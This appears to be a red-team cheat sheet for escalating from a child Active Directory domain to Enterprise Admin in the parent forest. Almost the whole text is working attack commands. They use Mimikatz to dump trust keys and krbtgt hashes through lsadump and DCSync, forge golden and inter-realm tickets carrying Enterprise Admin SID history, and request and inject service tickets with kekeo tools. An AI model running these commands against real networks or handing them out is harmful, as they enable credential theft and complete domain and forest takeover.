# Enterprise Admins

## Child to parent - trust tickets

**Dump trust keys**

Look for in trust key from child to parent (first command) - This worked best for me! Second command didn't work :( Look for NTLM hash (second command)

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
```

**Create an inter-realm TGT**

```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
```

**Create a TGS for a service (kekeo\_old)**

```
./asktgs.exe <kirbi file> CIFS/<forest dc name>
```

**Use TGS to access the targeted service (may need to run it twice) (kekeo\_old)**

```
./kirbikator.exe lsa .\<kirbi file>
```

**Check access to server**

```
ls \\<servername>\c$ 
```

## Child to parent - krbtgt hash

**Get krbtgt hash from dc**

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

**Create TGT**

the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
```

**Inject the ticket**

```
Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
```

**Get SID of enterprise admin**

```
Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
```
